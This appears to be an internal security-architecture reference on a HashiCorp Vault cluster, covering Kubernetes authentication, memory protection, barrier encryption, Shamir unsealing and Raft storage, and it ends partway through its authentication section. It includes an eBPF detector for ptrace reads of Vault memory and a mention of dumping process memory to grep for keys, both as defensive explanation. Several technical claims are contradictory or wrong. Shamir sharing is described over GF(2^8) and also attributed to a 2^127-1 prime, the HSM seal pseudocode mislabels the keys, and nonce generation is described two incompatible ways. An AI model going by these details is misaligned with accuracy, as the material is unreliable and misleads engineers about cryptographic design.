# Secrets Management & KMS Architecture: Deep Engineering & Security Breakdown

> **Document Type:** Internal Security Architecture / Systems Engineering Reference  
> **Classification:** Internal — Platform Security, Infrastructure Engineering, Red Team  
> **Scope:** End-to-end system — seal/unseal mechanics to key derivation, HSM integration to Shamir Secret Sharing  
> **Audience:** Security architects, platform engineers, SREs, interview candidates  

---

## Table of Contents

1. [Component Narrative](#1-component-narrative)
2. [OS & Hardware Layer Flow](#2-os--hardware-layer-flow)
3. [Cryptography & State Management](#3-cryptography--state-management)
4. [Backend / Control Plane Architecture](#4-backend--control-plane-architecture)
5. [Authentication & Trust Bootstrapping](#5-authentication--trust-bootstrapping)
6. [Security Controls & Anti-Tampering](#6-security-controls--anti-tampering)
7. [Attack Surface Mapping](#7-attack-surface-mapping)
8. [Attack Scenarios](#8-attack-scenarios)
9. [Failure Points & Scaling](#9-failure-points--scaling)
10. [Interview Questions](#10-interview-questions)

---

## 1. Component Narrative

### The Setting: HashiCorp Vault Cluster Serving a Production Kubernetes Platform

The platform manages 12,000 secrets across 400 microservices: database credentials, TLS certificates, API keys, encryption keys, and SSH certificates. Three Vault nodes form an HA cluster backed by Integrated Storage (Raft). An HSM (Luna Network HSM) holds Vault's master key material. All secrets are accessed via the Vault Agent injected as a sidecar in each pod.

---

### Step-by-Step Primary Function: Application Fetches a Database Password

**T=0ms — Application pod starts in Kubernetes**

The Kubernetes scheduler places the pod on a node. Before the application container starts, the Vault Agent Init Container runs first. This ordering is controlled by Kubernetes init containers — init containers must complete successfully before any app containers start.

**T=5ms — Vault Agent Init: Authenticate to Vault**

The init container runs `vault agent` with this config:
```hcl
auto_auth {
  method "kubernetes" {
    config = {
      role = "payments-service"
    }
  }
}
```

Vault Agent reads the Kubernetes Service Account Token from the well-known path:
`/var/run/secrets/kubernetes.io/serviceaccount/token`

This is a **projected ServiceAccount token** — a JWT issued by the Kubernetes API server, signed with the cluster's OIDC key pair, containing:
```json
{
  "iss": "https://kubernetes.default.svc.cluster.local",
  "sub": "system:serviceaccount:payments:payments-service",
  "aud": ["vault"],
  "exp": 1716007200,
  "iat": 1716003600,
  "kubernetes.io": {
    "namespace": "payments",
    "pod": {
      "name": "payments-api-7d8f9b-x4k2p",
      "uid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
    },
    "serviceaccount": {
      "name": "payments-service",
      "uid": "11111111-2222-3333-4444-555555555555"
    }
  }
}
```

**T=10ms — Vault Agent POST /v1/auth/kubernetes/login**

Vault Agent sends the JWT to Vault's Kubernetes auth endpoint:

```
POST /v1/auth/kubernetes/login HTTP/1.1
Host: vault.internal:8200
Content-Type: application/json

{
  "role": "payments-service",
  "jwt": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

**T=12ms — Vault validates the Kubernetes JWT**

Vault's Kubernetes auth method:
1. Decodes the JWT header to get the `kid` (key ID)
2. Fetches the Kubernetes JWKS endpoint: `https://kubernetes.default.svc.cluster.local/.well-known/openid-configuration` → `jwks_uri`
3. Fetches JWKS: list of public keys indexed by `kid`
4. Verifies JWT signature: `RS256_Verify(header.payload, signature, jwks[kid])`
5. Validates claims: `exp`, `iss`, `aud`, `sub` format
6. Validates `sub` matches bound service account: `system:serviceaccount:payments:payments-service`
7. Looks up role `payments-service` in Vault's storage: allowed policies, TTL
8. Optionally validates pod UID against Kubernetes API (TokenReview API): calls Kubernetes to confirm the JWT is still valid (pod hasn't been deleted)

**T=25ms — Vault issues a Vault Token**

Vault generates a token:
```json
{
  "auth": {
    "client_token": "s.xKsdfJHK2349sndfkjhSDFkjh",
    "accessor": "acc.ABCDEFGHIJKLMNOPQRSTUVWXYZab",
    "policies": ["payments-db-read", "payments-tls"],
    "token_type": "service",
    "lease_duration": 3600,
    "renewable": true
  }
}
```

The `client_token` is a **random 26-byte value** (base62 encoded) prefixed with `s.` (service token) or `b.` (batch token). It is stored in Vault's backend storage **only as its HMAC-SHA256 hash** (using Vault's barrier key). The plaintext token never persists to disk.

**T=30ms — Vault Agent fetches secret**

```
GET /v1/secret/data/payments/database/primary
X-Vault-Token: s.xKsdfJHK2349sndfkjhSDFkjh
```

Vault:
1. Extracts the token from the header
2. Computes HMAC-SHA256(token) → looks up the HMAC in storage
3. If found: retrieves the token's associated metadata (policies, TTL, entity)
4. Checks policy: does `payments-db-read` allow `read` on `secret/data/payments/database/primary`?
5. Reads from encrypted backend: decrypts the entry using the barrier key
6. Returns the plaintext secret

**T=35ms — Vault Agent writes secret to tmpfs volume**

The Vault Agent writes the secret to a memory-backed tmpfs volume shared between the init container and the application container:
```
/vault/secrets/database-creds
```

The file contains:
```
username=payments_svc_prod
password=Ks8#mNp2$xQ7wYr
host=db-primary.payments.svc.cluster.local
port=5432
```

**Why tmpfs, not a regular volume?**
`tmpfs` is RAM-backed — it never touches disk, never appears in swap (if swap is disabled, as it should be in production), and is destroyed when the pod terminates. A regular `emptyDir` volume might be written to the node's disk, creating a persistent copy of the secret.

**T=40ms — Application container starts, reads secret**

The application container reads `/vault/secrets/database-creds` at startup. The file was written by the init container.

**T=∞ — Vault Agent sidecar maintains the secret lifecycle**

After the init container completes, the Vault Agent sidecar container continues running. It:
1. Monitors the token TTL: renews it at 50% of remaining lease
2. Monitors the secret lease: renews or re-fetches when the dynamic secret nears expiry
3. Writes updated secrets back to the tmpfs volume
4. Sends SIGHUP to the application process when the secret changes (so the app can reload without restart)

---

## 2. OS & Hardware Layer Flow

### The Memory Architecture of Vault

Understanding where Vault's sensitive material lives in OS memory is critical to understanding both its security and its attack surface.

```
═══════════════════════════════════════════════════════════════════════════════
              VAULT PROCESS MEMORY LAYOUT (Linux, x86-64)
═══════════════════════════════════════════════════════════════════════════════

VIRTUAL ADDRESS SPACE OF vault PROCESS (PID 1337)
┌─────────────────────────────────────────────────────────────────────────────┐
│ 0xFFFFFFFF_FFFFFFFF  ← kernel space (inaccessible from user mode)          │
│ ...                                                                         │
│ 0x00007FFF_FFFFFFFF  ← top of user space                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│ STACK (grows downward)                                                      │
│  └── Function call frames                                                   │
│  └── Local variables (may temporarily hold key material)                   │
│  └── Stack is NOT locked (mlock not applied to stack by default)           │
│      ← RISK: stack can be swapped if swap is enabled                       │
├─────────────────────────────────────────────────────────────────────────────┤
│ MMAP REGION                                                                 │
│  └── libc.so, libcrypto.so and other shared libraries                      │
│  └── Go runtime (Vault is written in Go)                                   │
│      ← Go GC can COPY memory during collection                             │
│      ← Key material in Go heap may be copied to new addresses              │
│      ← Old copies may NOT be zeroed before GC reclaims them                │
│      ← CRITICAL SECURITY CONCERN — see §3                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│ HEAP                                                                        │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  BARRIER KEY BUFFER (mlocked, madvise MADV_DONTDUMP)               │   │
│  │  32 bytes of AES-256 key material                                   │   │
│  │  mlock() prevents this page from being swapped                      │   │
│  │  madvise(MADV_DONTDUMP) excludes from core dumps                    │   │
│  │  Physical pages: pinned in RAM                                       │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  TOKEN HMAC KEY (mlocked, MADV_DONTDUMP)                           │   │
│  │  32 bytes — used to HMAC incoming token strings                     │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  REGULAR HEAP (NOT mlocked)                                         │   │
│  │  - Secret data fetched from storage (after decrypt)                 │   │
│  │  - Token metadata                                                    │   │
│  │  - HTTP request/response buffers                                     │   │
│  │  - Raft log entries                                                  │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────────────────────────┤
│ BSS / DATA                                                                  │
│  └── Global variables, initialized data                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│ TEXT (.text)                                                                │
│  └── Vault binary code (read-only after loading)                          │
│  └── W^X enforced: pages are either Writable or eXecutable, never both    │
└─────────────────────────────────────────────────────────────────────────────┘

HARDWARE LAYER
┌─────────────────────────────────────────────────────────────────────────────┐
│  HSM (Luna Network HSM 7 / AWS CloudHSM / Azure Dedicated HSM)            │
│  ┌───────────────────────────────────────────────────────────────────────┐ │
│  │  MASTER WRAPPING KEY (never leaves HSM)                               │ │
│  │  2048-bit RSA or 256-bit AES key in FIPS 140-2 Level 3 hardware      │ │
│  │  All Vault barrier key material wrapped by this key                   │ │
│  │  Key operations: RSA_Wrap, RSA_Unwrap, AES_GCM_Encrypt               │ │
│  └───────────────────────────────────────────────────────────────────────┘ │
│  Connected via: PKCS#11 provider (network HSM) or /dev/hsm (local HSM)    │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

### Kernel Interactions: What Vault Does at the Syscall Level

```
SYSCALL PROFILE OF VAULT PROCESS (via strace / eBPF):

MEMORY MANAGEMENT:
  mmap(NULL, 131072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
    → Allocate Go heap memory
    
  mlock(0x7f..., 4096)
    → Lock the barrier key page in physical RAM
    → Prevents page from being swapped to disk
    → Requires: CAP_IPC_LOCK capability or RLIMIT_MEMLOCK sufficient
    → Without this: barrier key could appear in swap file unencrypted
    
  madvise(0x7f..., 4096, MADV_DONTDUMP)
    → Exclude this page from core dumps
    → Prevents: sudo gcore vault_pid → grep key material in dump
    → This is advisory — a ptrace-capable process can still read the memory
    
  madvise(0x7f..., 4096, MADV_WIPEONFORK)
    → If process is forked, zero this page in the child
    → Prevents key material inheritance by fork()ed children

NETWORK I/O:
  socket(AF_INET6, SOCK_STREAM, 0) = 7
  bind(7, {sa_family=AF_INET6, port=8200}, 28) = 0
  accept4(7, ..., SOCK_NONBLOCK) = 12  ← new client connection
  
  read(12, ..., 16384) = 2048  ← read TLS record
  write(12, ..., 1500) = 1500  ← write TLS record
  
  Note: Vault uses Go's net/http which uses non-blocking I/O
        All network operations use epoll under the hood

FILE OPERATIONS (storage backend):
  openat(AT_FDCWD, "/vault/data/vault.db", O_RDWR|O_CREAT) = 15
    ← BoltDB/bbolt embedded database (Raft integrated storage)
    
  pwrite64(15, "\x00\x01\x02...", 4096, 12288)
    ← Writing encrypted Raft log entries to disk
    ← Data is ALREADY encrypted by Vault's barrier before disk write
    ← Even if someone reads the raw BoltDB file: gibberish without barrier key

PROCESS CAPABILITIES CHECK:
  capget(cap_hdr, cap_data)
    → Vault checks its own capabilities at startup
    → Fails-safe if: no CAP_IPC_LOCK → cannot mlock keys → logs warning
    → In production: Vault SHOULD run with at minimum: CAP_IPC_LOCK, NET_BIND_SERVICE

ENTROPY:
  getrandom(buf, 256, GRND_NONBLOCK) = 256
    → Vault uses the kernel's random pool for all key generation
    → Never uses userspace PRNG for cryptographic operations
    → getrandom() blocks if entropy pool is exhausted (GRND_NONBLOCK returns error)
```

---

### eBPF Observability on Vault

To monitor Vault's security posture without modifying it:

```c
// eBPF program: detect when vault process memory is read by another process
// Attached to: sys_enter_ptrace tracepoint

SEC("tracepoint/syscalls/sys_enter_ptrace")
int detect_vault_ptrace(struct trace_event_raw_sys_enter *ctx) {
    long request = ctx->args[0];
    pid_t target_pid = (pid_t)ctx->args[1];
    
    // Check if target PID is vault
    struct task_struct *task = bpf_get_current_task();
    
    // Is the target process vault?
    struct task_struct *target = get_task_by_pid(target_pid);
    if (!target) return 0;
    
    char comm[16];
    bpf_probe_read_kernel_str(comm, sizeof(comm), target->comm);
    
    if (str_contains(comm, "vault")) {
        // Vault is being ptraced! Alert.
        struct ptrace_event evt = {
            .attacker_pid = bpf_get_current_pid_tgid() >> 32,
            .target_pid = target_pid,
            .request = request,
            .timestamp = bpf_ktime_get_ns()
        };
        bpf_perf_event_output(ctx, &ptrace_events, BPF_F_CURRENT_CPU, &evt, sizeof(evt));
        
        // For PTRACE_PEEKDATA (reading Vault's memory):
        if (request == PTRACE_PEEKDATA) {
            // This is a red flag — someone is reading Vault's memory
            bpf_perf_event_output(ctx, &critical_events, ...);
        }
    }
    return 0;
}
```

---

### Hardware Enclave: Running Vault in Intel SGX

For the highest-security deployments, Vault can run inside an Intel SGX enclave. This fundamentally changes the threat model:

```
WITHOUT SGX:
  Root user can: ptrace Vault, read /proc/vault_pid/mem, dump memory
  Hypervisor can: pause Vault, inspect guest memory
  Physical attacker can: cold boot attack, DMA attack
  
WITH SGX (Vault in enclave):
  ENCLAVE MEMORY (EPC - Enclave Page Cache):
    - Encrypted by CPU with a key only the CPU knows
    - CPU decrypts pages only when executing enclave code (Ring 3, enclave mode)
    - Root user read of enclave memory: returns garbage (hardware encryption)
    - Hypervisor access to enclave memory: encrypted garbage
    - DMA to enclave memory: encrypted garbage (CPU enforces this)
  
  ATTESTATION:
    - SGX generates a signed report: "This specific code is running in an
      Intel SGX enclave on this specific CPU"
    - Report signed by SGX EPID (Enhanced Privacy ID) or DCAP key
    - Remote party can verify: the Vault binary in the enclave is unmodified
  
  SEALING:
    - Enclave can seal data: AES-GCM encrypt with a key derived from:
      enclave measurement (MRENCLAVE) + processor key
    - Sealed data can ONLY be unsealed by the SAME enclave code on the SAME CPU
    - If you replace vault with modified_vault: different MRENCLAVE → can't unseal
    - This provides tamper evidence AND tamper prevention

  LIMITATION: SGX TCB is only the CPU + enclave code
    If enclave code has a bug (memory safety): still exploitable within enclave
    SGX doesn't protect against software bugs, only hardware/privileged-SW attacks
```

---

## 3. Cryptography & State Management

### The Vault Barrier: Core Cryptographic Construct

The barrier is the most important security construct in Vault. Everything stored to the backend is encrypted by the barrier. Nothing is ever written to storage in plaintext.

```
BARRIER ENCRYPTION FLOW
═══════════════════════════════════════════════════════════════════════════════

UNSEAL SEQUENCE (happens at startup, or after seal):

Step 1: Unseal keys are submitted (3 of 5 Shamir shares, or HSM single key)
        [Unseal Key 1] [Unseal Key 2] [Unseal Key 3]
              │               │               │
              └───────────────┼───────────────┘
                              │
                    Shamir Secret Reconstruction
                    (Lagrange interpolation over GF(2^8))
                              │
                              ▼
                   Master Key (256-bit random)
                   = K_master
                              │
                              │ K_master is NEVER stored persistently
                              │ It exists ONLY in Vault process RAM
                              ▼
                   K_master is used to decrypt the Barrier Key
                   from the backend storage:
                   
                   K_barrier = AES-256-GCM.Decrypt(
                       key=K_master,
                       ciphertext=stored_encrypted_barrier_key,
                       nonce=<stored alongside>,
                       aad=<vault version + cluster ID>
                   )
                              │
                              ▼
                   K_barrier (32 bytes) loaded into mlocked memory
                   This is the key used for ALL secret storage

WHY TWO KEYS (master + barrier)?
  Rationale: The barrier key is the "operational" key — it encrypts everything.
  The master key protects the barrier key.
  
  Key rotation: to rotate the barrier key, Vault re-encrypts ALL secrets with
  the new barrier key, then discards the old one. This is a "rekey" operation.
  
  Seal/unseal: to seal Vault, just discard K_master and K_barrier from RAM.
  No key material remains in process memory.
  The barrier key on disk is safe: it's encrypted with K_master.
  K_master is split across 5 key holders (Shamir shares) — no single person can unseal alone.

AES-256-GCM ENCRYPTION (every storage write):
  
  Plaintext: { "value": { "username": "admin", "password": "s3cr3t" } }
             (JSON-encoded secret value)
  
  nonce = getrandom(12 bytes)  ← 96-bit random nonce
                                 NEVER reuse nonce with same key
                                 Vault uses a monotonic counter + random to ensure uniqueness
  
  ciphertext, tag = AES-256-GCM.Encrypt(
      key=K_barrier,
      plaintext=json_bytes,
      nonce=nonce,
      aad=path  ← the storage path is AAD: "secret/payments/database/primary"
                  This binds the ciphertext to its path
                  Moving the ciphertext to a different path will fail decryption
  )
  
  stored_entry = nonce || tag || ciphertext  ← 12 + 16 + len(plaintext)
  
  On read:
  plaintext = AES-256-GCM.Decrypt(
      key=K_barrier,
      ciphertext=stored_entry[28:],
      nonce=stored_entry[:12],
      tag=stored_entry[12:28],
      aad=path  ← MUST match the path used during encryption
  )
  
  If aad doesn't match (entry was moved): Decrypt returns error (authentication failure)
  This is the CRITICAL property: path is authenticated, preventing path confusion attacks.
```

---

### Shamir Secret Sharing: The Math

```
SHAMIR SECRET SHARING (k=3 of n=5 scheme)
═══════════════════════════════════════════════════════════════════════════════

SECRET: K_master = 256-bit random number = s (treat as element in GF(2^8)^32)

Step 1: Choose a random polynomial of degree k-1 = 2:
    f(x) = a₂x² + a₁x + a₀  (mod prime p)
    
    where:
    a₀ = s (the secret is the constant term)
    a₁ = random_256_bits
    a₂ = random_256_bits

Step 2: Generate n=5 shares:
    Share_1 = (1, f(1))  = (1, a₂ + a₁ + a₀ mod p)
    Share_2 = (2, f(2))  = (2, 4a₂ + 2a₁ + a₀ mod p)
    Share_3 = (3, f(3))  = (3, 9a₂ + 3a₁ + a₀ mod p)
    Share_4 = (4, f(4))  = (4, 16a₂ + 4a₁ + a₀ mod p)
    Share_5 = (5, f(5))  = (5, 25a₂ + 5a₁ + a₀ mod p)

Step 3: Reconstruction (Lagrange interpolation) with any 3 shares:
    Given shares (x₁,y₁), (x₂,y₂), (x₃,y₃):
    
    f(x) = Σᵢ yᵢ × Πⱼ≠ᵢ (x - xⱼ)/(xᵢ - xⱼ)
    
    s = f(0) = Σᵢ yᵢ × Πⱼ≠ᵢ (0 - xⱼ)/(xᵢ - xⱼ)
    
    With ANY 3 of the 5 shares, you can compute s.
    With only 2 shares, you cannot determine s (information-theoretically secure:
    2 shares are consistent with ALL possible values of s).

REAL VAULT IMPLEMENTATION:
  Vault uses a prime p = 2^127 - 1 (Mersenne prime)
  Each share is encoded as base64 and distributed to key holders
  Key holders may be: physical persons with a passphrase-protected share,
                       or AWS KMS (one share wrapped by KMS), or hardware key

HSM-BASED SEAL (alternative to Shamir):
  Instead of distributing shares to humans, use an HSM:
  
  K_master = AES-256-GCM.Encrypt(key=HSM_master_key, plaintext=K_barrier)
  Stored: encrypted K_barrier in backend storage
  
  To unseal:
  K_barrier = HSM.Decrypt(ciphertext=stored_encrypted_K_barrier)
              ← This operation happens INSIDE the HSM
              ← K_master never leaves the HSM hardware
  
  This enables AUTO-UNSEAL: Vault restarts → contacts HSM → HSM decrypts barrier key
  → Vault is unsealed without human intervention
  
  The tradeoff:
  Shamir: k humans required to unseal (manual, ceremonial, very secure)
  HSM auto-unseal: no humans required (operational simplicity) but:
                   if HSM is compromised → attacker can unseal Vault at will
                   Security depends entirely on HSM access controls
```

---

### Key Derivation for Transit Engine

Vault's Transit engine provides encryption-as-a-service. It derives per-version keys using HKDF:

```python
# Vault Transit: key versioning via HKDF
# This is the conceptual model (actual Vault uses Go's crypto/hkdf)

import hmac, hashlib, struct

def derive_transit_version_key(
    key_id: str,        # "payments-encryption" 
    version: int,        # 3 (key version)
    root_key: bytes,     # 32-byte root key from Vault barrier
    context: bytes       # b"vault transit key derivation v1"
) -> bytes:
    """
    HKDF (RFC 5869) key derivation:
    
    HKDF-Extract:
      PRK = HMAC-SHA256(salt=root_key, IKM=key_id.encode())
    
    HKDF-Expand:
      OKM = T(1) where:
      T(1) = HMAC-SHA256(PRK, context || version_bytes || 0x01)
    """
    # Extract step
    prk = hmac.new(
        key=root_key,
        msg=key_id.encode('utf-8'),
        digestmod=hashlib.sha256
    ).digest()
    
    # Expand step
    version_bytes = struct.pack('>I', version)  # Big-endian uint32
    info = context + version_bytes
    okm = hmac.new(
        key=prk,
        msg=info + bytes([1]),  # Counter byte = 1
        digestmod=hashlib.sha256
    ).digest()
    
    return okm  # 32-byte derived key for this version

# Result: Each key version has a unique 32-byte AES key
# All derived from the root key stored in Vault's encrypted backend
# Key rotation: increment version, derive new key from same root
# Old versions: kept for decryption of data encrypted with old version
# New encryptions: always use the latest version
```

---

### TLS/mTLS Internal Architecture

```
VAULT CLUSTER: INTERNAL mTLS (Node-to-Node Raft Replication)
═══════════════════════════════════════════════════════════════════════════════

vault-node-1 (Leader)              vault-node-2 (Follower)
      │                                      │
      │── TLS 1.3 ClientHello ──────────────▶│
      │   ALPN: vault-raft-v1                │  ← Custom ALPN identifies Raft protocol
      │   Key share: X25519                  │
      │   SNI: vault-node-2.internal         │
      │                                      │
      │◀── ServerHello + Certificate ────────│
      │    Subject: vault-node-2.internal     │
      │    Issuer: Vault Cluster CA           │
      │    SAN: vault-node-2.internal,        │
      │         127.0.0.1, ::1               │
      │    Extension: vault_role=follower     │  ← Custom extension
      │    Extension: cluster_id=clus-abc123  │  ← Cluster binding
      │◀── CertificateRequest ───────────────│  ← Require client cert
      │◀── Finished ─────────────────────────│
      │                                      │
      │── Certificate ───────────────────────▶│
      │   Subject: vault-node-1.internal      │
      │   Issuer: Vault Cluster CA            │
      │   Extension: vault_role=leader        │
      │── CertificateVerify ─────────────────▶│
      │── Finished ─────────────────────────▶│
      │                                      │
      │══ Raft log replication ══════════════│
      │   AppendEntries RPC (protobuf)       │
      │   {term, leader_id, prev_log_index,  │
      │    entries: [{type, key, value}],    │
      │    leader_commit}                    │

CERTIFICATE MANAGEMENT:
  Vault generates its own internal CA at initialization:
  - CA key: 4096-bit RSA, stored in Vault's own encrypted backend
  - Node certs: generated at startup, 72-hour TTL, auto-renewed
  - CA cert: 10-year validity, manually rotated
  
  Why short-lived node certs (72h)?
  - Compromise of a node's private key → attacker can join cluster as that node
  - Short TTL limits the window: attacker must renew cert to maintain access
  - Renewal requires communicating with the cluster → detectable
  
  Certificate pinning for clients:
  - Vault agent pins the cluster's CA certificate
  - Even with a valid cert from a different CA: rejected
  - Prevents: MITM with a cert from Let's Encrypt or corporate CA
```

---

## 4. Backend / Control Plane Architecture

### Vault Cluster: Raft Integrated Storage

```
VAULT HA CLUSTER ARCHITECTURE (Integrated Raft Storage)
═══════════════════════════════════════════════════════════════════════════════

                    ┌──────────────────────────────────────────────────┐
                    │              VAULT CLUSTER                        │
                    │                                                   │
                    │  ┌────────────────┐  ┌────────────────┐         │
                    │  │  vault-node-1  │  │  vault-node-2  │         │
                    │  │  (LEADER)      │  │  (FOLLOWER)    │         │
                    │  │                │  │                │         │
                    │  │  State:        │  │  State:        │         │
                    │  │  - UNSEALED    │  │  - UNSEALED    │         │
                    │  │  - ACTIVE      │  │  - STANDBY     │         │
                    │  │                │  │                │         │
                    │  │  Barrier: ✓    │  │  Barrier: ✓    │         │
                    │  │  (key in RAM)  │  │  (key in RAM)  │         │
                    │  │                │  │                │         │
                    │  │  Serves reads  │  │  Forwards all  │         │
                    │  │  + writes      │  │  requests to   │         │
                    │  └───────┬────────┘  │  leader        │         │
                    │          │           └────────────────┘         │
                    │          │ Raft AppendEntries                    │
                    │          │ (mTLS, replicates ALL writes)        │
                    │          ▼                                       │
                    │  ┌────────────────┐                             │
                    │  │  vault-node-3  │                             │
                    │  │  (FOLLOWER)    │                             │
                    │  │  (STANDBY)     │                             │
                    │  └────────────────┘                             │
                    └──────────────────────────────────────────────────┘
                                    │
                    ┌───────────────┼────────────────────────────────┐
                    │     STORAGE LAYER (per-node, on disk)          │
                    │                                                 │
                    │  BoltDB (bbolt) embedded key-value store       │
                    │  File: /vault/data/vault.db                    │
                    │                                                 │
                    │  All entries are barrier-encrypted:            │
                    │  key: "secret/payments/db" (hashed)            │
                    │  value: AES-256-GCM(barrier_key, secret_json)  │
                    │                                                 │
                    │  Raft log: also barrier-encrypted              │
                    │  Log entry: {index, term, type, key, value}    │
                    │  All stored: AES-256-GCM encrypted             │
                    └─────────────────────────────────────────────────┘

RAFT LEADER ELECTION:
  Term: monotonically increasing integer
  On startup: each node votes for itself if it hasn't heard from leader in:
    election_timeout = random(150ms, 300ms)  ← randomized to prevent split votes
  
  To win election: candidate needs (n/2 + 1) votes = 2 votes in 3-node cluster
  
  Write commitment:
    Client writes to leader
    Leader appends to local log
    Leader sends AppendEntries to all followers
    Leader commits when (n/2 + 1) nodes acknowledge: 2/3 nodes must acknowledge
    Leader responds success to client only after commit
    Durability: the write is on at least 2 of 3 nodes' disks
    
  Read options:
    Consistent read (default): leader confirms it is still leader, reads its latest committed state
    Stale read: can read from followers (possibly behind leader)
    Vault uses: consistent reads only for all secret operations
```

---

### Sync vs. Async Flows

```
SYNCHRONOUS (blocking, on critical path):

1. Secret read/write:
   Client → Vault API (HTTP/TLS) → policy check → barrier decrypt/encrypt → storage
   All synchronous within a single HTTP request-response
   P50: 2ms, P99: 50ms (local storage)
   
2. Token lookup (every request):
   Extract token from header → HMAC(token) → BoltDB lookup → metadata retrieval
   Cannot be async: every API call requires this
   Optimization: in-memory LRU cache of token HMAC → metadata (1000 entry cache)
   
3. PKI certificate issuance:
   Client → Vault → generate key pair → sign cert → return
   Synchronous: client receives cert in the response
   Bottleneck: RSA key generation (4096-bit: ~50ms on modern CPU)
   
ASYNCHRONOUS:

4. Lease renewal / expiry:
   Background goroutine: ExpirationManager
   Runs every LeaseRenewalTick (default: 100ms)
   Scans in-memory heap of expiring leases
   For each lease reaching 50% of TTL: sends renewal RPC
   For each lease past TTL: revokes token/secret
   
5. Raft log compaction (snapshotting):
   Background goroutine triggers when log > 131,072 entries
   Creates a snapshot of current state → truncates old log entries
   This compaction can cause brief latency spikes (write stall during snapshot)
   
6. Audit logging:
   Every request: Vault writes an audit entry
   Audit backends can be: file (synchronous) or socket (async)
   CRITICAL: Vault BLOCKS the request if ALL audit backends fail
   (Audit failure = security event = Vault stops accepting requests)
   This is intentional: better to be unavailable than to operate without audit trail
   
7. Token cleanup (background):
   Expired tokens are removed from storage by background expiry worker
   Not on the critical request path
```

---

### Storage Backend Encryption at Rest

```
PHYSICAL STORAGE LAYOUT (BoltDB file: vault.db):

vault.db (BoltDB):
├── Bucket: "_sys"
│   ├── "core/keyring"              ← Encrypted barrier keys (AES-GCM wrapped)
│   ├── "core/seal-config"          ← Seal configuration (type, shares, threshold)
│   ├── "core/cluster/local/info"   ← Cluster metadata
│   └── "core/leader"               ← Current leader info
│
├── Bucket: "logical"
│   ├── "secret/payments/db/"       ← KV secrets (encrypted with barrier key)
│   ├── "auth/kubernetes/..."       ← Auth method state
│   └── "pki/..."                   ← PKI CA material and certs
│
└── Bucket: "sys"
    ├── "token/..."                  ← Token HMAC → metadata map
    └── "expire/..."                 ← Lease expiry data

EVERY VALUE IN BoltDB IS:
  prefix(1 byte) | nonce(12 bytes) | tag(16 bytes) | ciphertext(variable)
  
  prefix: version byte (currently 0x00)
  nonce: 96-bit random (from getrandom() syscall)
  tag: AES-GCM authentication tag (16 bytes)
  ciphertext: AES-256-GCM(barrier_key, plaintext, nonce, aad=path)
  
  NOTHING in BoltDB is human-readable without the barrier key.
  Even the bucket keys are stored as their SHA-256 hashes (path prefix).
```

---

## 5. Authentication & Trust Bootstrapping

### The Secret Zero Problem: How Vault Itself Authenticates

```
VAULT'S SECRET ZERO PROBLEM:

Q: When vault-node-1 starts, how does it know it's talking to the real vault-node-2 
   and not an impersonator?

A: It uses VAULT'S OWN CA — the cluster CA generated at Vault initialization.
   The CA key is stored INSIDE Vault's encrypted backend.
   The CA cert is distributed out-of-band (during cluster setup).
   
   Circle: Vault uses its own backend to store the key that secures communication
   between Vault nodes. This is only possible because the backend is encrypted by
   the barrier key, and the barrier key is unsealed before any cluster communication begins.

BOOTSTRAP SEQUENCE (fresh cluster initialization):

vault operator init --key-shares=5 --key-threshold=3

INTERNAL SEQUENCE:
  1. Generate root token (128-bit random)
     Store HMAC(root_token) in backend, flag as never-expiring
  
  2. Generate barrier key (256-bit AES)
     This key does NOT yet exist in any storage — it's brand new
  
  3. Generate master key (256-bit random)
     Split into 5 Shamir shares
     Output shares to operator (ONCE — never stored)
  
  4. Encrypt barrier key with master key:
     encrypted_barrier_key = AES-256-GCM(master_key, barrier_key)
     Store encrypted_barrier_key in backend at core/keyring
  
  5. Generate Cluster CA:
     ca_key = Ed25519 key pair (or RSA-4096)
     ca_cert = self-signed X.509 cert (10-year validity)
     Store ca_key (encrypted with barrier_key) in backend
     Store ca_cert (public, unencrypted) in backend
  
  6. Return to operator:
     - 5 unseal key shares (Shamir shares of master_key)
     - 1 root token
     - These are shown ONCE and must be saved securely
     
  7. Vault SEALS itself immediately after init
     (discards barrier_key and master_key from RAM)
     Cluster is not operational until unseal

UNSEAL SEQUENCE (every restart):
  
  3 key holders submit their shares:
  
  Holder 1: vault operator unseal AAAA...
  Holder 2: vault operator unseal BBBB...
  Holder 3: vault operator unseal CCCC...
  
  Internal sequence:
  1. Accumulate shares in memory (not persisted)
  2. When threshold reached: reconstruct master_key via Lagrange interpolation
  3. Fetch encrypted_barrier_key from backend (the backend is readable even sealed
     because BoltDB is just reading bytes — decryption is what requires the key)
  4. Decrypt: barrier_key = AES-256-GCM.Decrypt(master_key, encrypted_barrier_key)
  5. Load barrier_key into mlocked memory
  6. Discard master_key from memory (zero-fill the buffer)
  7. Run barrier integrity check: read a known test value, verify it decrypts correctly
  8. Load internal CA from backend (now decryptable)
  9. Generate node TLS cert signed by internal CA
  10. Start accepting requests — Vault is UNSEALED
```

---

### Kubernetes Auth: The Real Trust Chain

```
HOW VAULT TRUSTS A KUBERNETES JWT
═══════════════════════════════════════════════════════════════════════════════

SETUP (done once by Vault admin):
  vault auth enable kubernetes
  
  vault write auth/kubernetes/config \
    kubernetes_host="https://kubernetes.default.svc.cluster.local" \
    kubernetes_ca_cert=@/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
    token_reviewer_jwt=@/path/to/reviewer-sa-token
  
  WHAT THIS CONFIGURES:
  - kubernetes_host: Vault will call this API server to validate tokens
  - kubernetes_ca_cert: Vault uses this cert to TLS-verify the K8s API server
  - token_reviewer_jwt: Vault uses this JWT to authenticate its own API calls to K8s
    (Vault itself is a client of the Kubernetes API server)

RUNTIME JWT VALIDATION:
  
  Option 1: Local JWT Validation (faster, uses JWKS)
    Vault fetches: https://kubernetes.default.svc.cluster.local/.well-known/openid-configuration
    Gets: { jwks_uri: "https://kubernetes.default.svc.cluster.local/openid/v1/jwks" }
